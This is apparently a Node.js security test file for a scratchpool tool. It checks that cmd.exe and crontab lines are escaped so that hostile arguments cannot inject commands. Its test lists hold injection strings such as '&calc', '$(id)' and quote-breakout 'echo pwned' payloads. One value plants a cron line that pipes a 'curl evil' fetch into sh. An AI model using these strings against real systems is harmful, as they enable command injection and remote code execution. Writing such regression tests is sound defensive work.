// Hostile-input tests for the two places scratchpool builds a line another parser reads:
//   * the Windows cmd.exe line that runs sf.cmd (lib/sf.mjs, CodeQL js/shell-command-injection-from-environment)
//   * the crontab line printed by `service install` without systemd (lib/service.mjs, js/incomplete-sanitization)
// The pure-function tests run on every OS against small models of the parsers (cmd.exe caret/quote phase,
// the MSVCRT argv split, cronie's %-unescape); the end-to-end tests run the real cmd.exe (Windows) or the
// real /bin/sh (POSIX) and check the hostile value arrives byte-for-byte.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { Sf, winCmdArgv, winQuote, winEscapeCommand } from '../skills/scratchpool/scripts/lib/sf.mjs';
import { buildCrontabLine, cronShQuote } from '../skills/scratchpool/scripts/lib/service.mjs';
import { STUB } from './helpers.mjs';

// ------------------------------------------------------------------ parser models

// cmd.exe phase 2 outside a ( ) block: '^' escapes the next character outside quotes, '"' toggles quote mode,
// and an unescaped & | < > ( ) outside quotes is an operator. Returns the processed text and any bare operators.
function cmdPhase2(line) {
  let out = '';
  let quoted = false;
  const bare = [];
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quoted) { out += c; if (c === '"') quoted = false; continue; }
    if (c === '^') { i++; if (i < line.length) out += line[i]; continue; }
    if (c === '"') { quoted = true; out += c; continue; }
    if ('&|<>()'.includes(c)) bare.push(c);
    out += c;
  }
  return { out, bare };
}

// The MSVCRT / CommandLineToArgvW rules node.exe uses to split its command line.
function msvcrtSplit(s) {
  const args = [];
  let cur = '';
  let quoted = false;
  let has = false;
  let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (c === '\\') {
      let n = 0;
      while (s[i] === '\\') { n++; i++; }
      if (s[i] === '"') {
        cur += '\\'.repeat(Math.floor(n / 2));
        if (n % 2) { cur += '"'; i++; }
      } else cur += '\\'.repeat(n);
      has = true;
      continue;
    }
    if (c === '"') {
      if (quoted && s[i + 1] === '"') { cur += '"'; i += 2; continue; }
      quoted = !quoted; has = true; i++; continue;
    }
    if (!quoted && (c === ' ' || c === '\t')) { if (has) { args.push(cur); cur = ''; has = false; } i++; continue; }
    cur += c; has = true; i++;
  }
  if (has) args.push(cur);
  return args;
}

// cmd /d /v:off /s /c "<line>" running the shim `node "%~dp0sf" %*` (tests/stub/sf.cmd, the npm/oclif shape):
// parse 1 is cmd /c, parse 2 is the shim's own line after %* is substituted. Returns what node sees as argv.
function throughCmdAndShim(bin, args) {
  const argv = winCmdArgv(bin, args);
  const line = argv[4];
  assert.ok(line.startsWith('"') && line.endsWith('"'), '/s strips one outer quote pair');
  assert.ok(!line.includes('%'), 'no % reaches cmd (percent expansion runs before carets are seen)');
  const p1 = cmdPhase2(line.slice(1, -1));
  assert.deepEqual(p1.bare, [], `parse 1 has no bare operator: ${line}`);
  assert.ok(p1.out.startsWith(bin + ' '), `the command token survives as one token: ${p1.out}`);
  const p2 = cmdPhase2(`node "C:\\stub\\sf" ${p1.out.slice(bin.length + 1)}`);
  assert.deepEqual(p2.bare, [], `parse 2 (the shim's %*) has no bare operator: ${p2.out}`);
  return msvcrtSplit(p2.out).slice(2);
}

// cronie / Vixie do_command: "\%" -> "%", "\x" kept as a pair, and an unescaped % ends the command.
function cronUnescape(cmd) {
  let out = '';
  let escaped = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (escaped) { if (c === '%') out = out.slice(0, -1) + '%'; else out += c; escaped = false; continue; }
    if (c === '\\') { escaped = true; out += c; continue; }
    if (c === '%') return { cmd: out, stdin: cmd.slice(i + 1) };
    out += c;
  }
  return { cmd: out, stdin: null };
}

// ------------------------------------------------------------------ corpora

const HOSTILE_ARGS = [
  'a&calc', 'x|whoami', '<in', '>out', 'a>>b', '2>&1', '^', '^^&', '!PATH!', '!', '"', 'a"b', '""',
  'a\\"&calc&\\"', '"&calc&"', '\\', 'trailing\\', 'tr\\\\', '\\\\server\\share', "it's", "'\"'\"'", '(x)', ')&(',
  'a b  c', '', ' ', ';,=', '`whoami`', '$(id)', '*?[]', '&&', '||', 'a^"&calc',
  'C:\\Program Files (x86)\\proj & co\\config\\project-scratch-def.json', 'me+test@x.com', 'my.alias-1_2',
  "SELECT Id, SignupUsername, Description, ExpirationDate, Status, CreatedDate FROM ScratchOrgInfo WHERE Status = 'Active'",
  'scratchpool:v1:me@corp.com:abc123:m1', 'alias=user@x.com', 'ünïcødé ✓',
];
const REJECTED_ARGS = ['%PATH%', '%PATH:x=y%', '%', '50%', 'a\nb', 'a\r\nb&calc', 'a\rb', 'a\0b', 'a\tb', '\u007f', '\u001b[31m'];

// ------------------------------------------------------------------ Windows cmd.exe (pure, all OSes)

test('cmd.exe line: every hostile argument reaches node byte-for-byte with no bare operator in either parse', () => {
  for (const bin of ['C:\\sf\\bin\\sf.cmd', 'C:\\Program Files (x86)\\sf & co\\bin\\sf.cmd']) {
    for (const a of HOSTILE_ARGS) {
      assert.deepEqual(throughCmdAndShim(bin, ['org', 'list', a]), ['org', 'list', a], JSON.stringify(a));
    }
    assert.deepEqual(throughCmdAndShim(bin, HOSTILE_ARGS), HOSTILE_ARGS, 'all at once');
  }
});

test('cmd.exe line: % and control characters (CR, LF, NUL, TAB, ESC, DEL) are rejected, never escaped', () => {
  for (const a of REJECTED_ARGS) {
    assert.throws(() => winQuote(a), (e) => e.code === 'USAGE' && /cmd\.exe/.test(e.message), JSON.stringify(a));
    assert.throws(() => winCmdArgv('C:\\sf\\sf.cmd', ['org', 'list', a]), (e) => e.code === 'USAGE', JSON.stringify(a));
  }
  for (const bin of ['C:\\100%\\sf.cmd', 'C:\\%TEMP%\\sf.cmd', 'C:\\a\nb\\sf.cmd', 'C:\\a\rcalc\\sf.cmd']) {
    assert.throws(() => winEscapeCommand(bin), (e) => e.code === 'USAGE', JSON.stringify(bin));
  }
});

test('cmd.exe line: a single caret layer (the previous escaping) lets the shim re-parse break out of quotes', () => {
  // Why arguments are escaped twice: with one layer, a \" inside an argument closes cmd's quote mode in the
  // shim's %* line and the & after it runs as a second command.
  const once = `"${winEscapeCommand('C:\\sf\\sf.cmd')} ${winQuote('a\\"&calc&\\"', 1)}"`;
  const p1 = cmdPhase2(once.slice(1, -1));
  assert.deepEqual(p1.bare, []);
  assert.deepEqual(cmdPhase2(`node "C:\\stub\\sf" ${p1.out.slice('C:\\sf\\sf.cmd '.length)}`).bare, ['&', '&']);
});

test('cmd.exe line: Sf.raw refuses a hostile argument before spawning anything', { skip: process.platform !== 'win32' }, () => {
  assert.throws(() => new Sf(STUB).raw(['org', 'list', '%COMSPEC%']), (e) => e.code === 'USAGE');
  assert.throws(() => new Sf(STUB).raw(['org', 'list', 'a\r\nwhoami']), (e) => e.code === 'USAGE');
});

test('cmd.exe line (real cmd.exe + stub sf.cmd): hostile arguments arrive intact', { skip: process.platform !== 'win32' }, () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-esc-'));
  const scenario = path.join(dir, 'scenario.json');
  fs.writeFileSync(scenario, JSON.stringify({ version: '2.150.0' }));
  const prev = process.env.SCRATCHPOOL_STUB_SCENARIO;
  process.env.SCRATCHPOOL_STUB_SCENARIO = scenario;
  try {
    const marker = path.join(dir, 'pwned');
    const args = ['org', 'list', ...HOSTILE_ARGS, `x" & echo pwned > "${marker}`, `x\\" & echo pwned > ${marker} & \\"`];
    new Sf(STUB).raw(args);
    const calls = fs.readFileSync(scenario + '.calls.jsonl', 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    assert.deepEqual(calls.at(-1).argv, args);
    assert.ok(!fs.existsSync(marker), 'no injected command ran');
  } finally {
    if (prev === undefined) delete process.env.SCRATCHPOOL_STUB_SCENARIO; else process.env.SCRATCHPOOL_STUB_SCENARIO = prev;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ------------------------------------------------------------------ crontab (pure, all OSes)

const HOSTILE_VALUES = [
  '/h o/me', '/tmp/50%', '/tmp/%PATH%', '/tmp/a\\%b', '/tmp/a\\\\%b', '/tmp/a\\\\\\%b', '/tmp/%%', '/tmp/\\', "/tmp/it's",
  "/tmp/'%'", '/tmp/$(touch pwned)', '/tmp/`id`', '/tmp/a;b&c|d>e', '/tmp/$HOME', '/tmp/"q"', '/tmp/*', '/tmp/~', '/tmp/!x',
];

test('cronShQuote: no value can end the cron command early, and the shell word decodes back to the value', () => {
  for (const v of HOSTILE_VALUES) {
    const q = cronShQuote(v);
    const r = cronUnescape(`echo ${q}`);
    assert.equal(r.stdin, null, `cron does not split ${JSON.stringify(v)} at a %`);
    // Decode the shell word: '...' runs literal, outside quotes only \x (here \' and %) occurs.
    let word = r.cmd.slice('echo '.length);
    let out = '';
    while (word.length) {
      if (word[0] === "'") { const j = word.indexOf("'", 1); out += word.slice(1, j); word = word.slice(j + 1); } else if (word[0] === '\\') { out += word[1]; word = word.slice(2); } else { out += word[0]; word = word.slice(1); }
    }
    assert.equal(out, v);
  }
});

test('cronShQuote: newlines and other control characters are rejected', () => {
  for (const v of ['/tmp/a\nb', '/tmp/a\n* * * * * curl evil|sh', '/tmp/a\rb', '/tmp/a\0b', '/tmp/a\tb']) {
    assert.throws(() => cronShQuote(v), (e) => e.code === 'USAGE', JSON.stringify(v));
    assert.throws(() => buildCrontabLine({ home: v, nodePath: '/n/node', scriptPath: '/s.mjs', sfPath: null, intervalMinutes: 5 }), (e) => e.code === 'USAGE');
  }
});

test('crontab: the previous "%" -> "\\%" escaping broke on a backslash before %', () => {
  // Old: shQuote(v).replace(/%/g, '\\%'). For v = "/tmp/a\%b" cron sees "\\" as a pair and the % unescaped.
  const old = `'/tmp/a\\%b'`.replace(/%/g, '\\%');
  assert.notEqual(cronUnescape(`echo ${old}`).stdin, null, 'the old escaping lets cron cut the command');
  assert.equal(cronUnescape(`echo ${cronShQuote('/tmp/a\\%b')}`).stdin, null, 'the new escaping does not');
});

// ------------------------------------------------------------------ crontab (real /bin/sh, POSIX)

test('crontab line (real /bin/sh): hostile home and script paths round-trip after cron unescaping', { skip: process.platform === 'win32' }, () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-cron-'));
  try {
    for (const name of ['50%', 'a\\%b', 'a\\\\%b', "it's %x%", '$(touch pwned)', '`id`;x&y|z', '%PATH%']) {
      const home = path.join(base, name);
      fs.mkdirSync(path.join(home, 'logs'), { recursive: true });
      // .cjs: Node's ESM loader refuses any path containing a backslash, unrelated to the quoting under test.
      const script = path.join(home, 'probe %.cjs');
      fs.writeFileSync(script, 'process.stdout.write(JSON.stringify({ home: process.env.SCRATCHPOOL_HOME, argv: process.argv.slice(1) }));\n');
      const line = buildCrontabLine({ home, nodePath: process.execPath, scriptPath: script, sfPath: null, intervalMinutes: 5 });
      assert.ok(line.startsWith('*/5 * * * * '));
      const r = cronUnescape(line.slice('*/5 * * * * '.length));
      assert.equal(r.stdin, null, `cron keeps the whole command for ${JSON.stringify(name)}`);
      const sh = spawnSync('/bin/sh', ['-c', r.cmd], { encoding: 'utf8', cwd: base });
      assert.equal(sh.status, 0, `${JSON.stringify(name)}: ${sh.stderr} ${r.cmd}`);
      const got = JSON.parse(fs.readFileSync(path.join(home, 'logs', 'cron.log'), 'utf8'));
      assert.deepEqual(got, { home, argv: [script, 'tick', '--json'] }, JSON.stringify(name));
      assert.ok(!fs.existsSync(path.join(base, 'pwned')), 'no command substitution ran');
    }
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
});
